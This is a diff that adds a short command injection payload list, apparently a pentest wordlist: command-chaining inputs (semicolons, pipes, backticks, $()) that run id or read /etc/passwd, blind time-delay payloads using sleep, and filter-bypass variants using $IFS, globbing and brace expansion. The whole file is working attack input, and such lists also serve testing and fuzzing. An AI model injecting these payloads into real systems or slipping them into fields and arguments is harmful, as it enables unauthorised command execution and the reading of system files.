@@ -1,0 +1,20 @@
+Command Injection
+bash; id
+| id
+&& id
+|| id
+`id`
+$(id)
+; cat /etc/passwd
+| cat /etc/passwd
+
+# Blind
+; sleep 5
+| sleep 5
+$(sleep 5)
+
+# Filter bypass
+c$()at /etc/passwd
+/bin/c*t /etc/passwd
+cat$IFS/etc/passwd
+{cat,/etc/passwd}
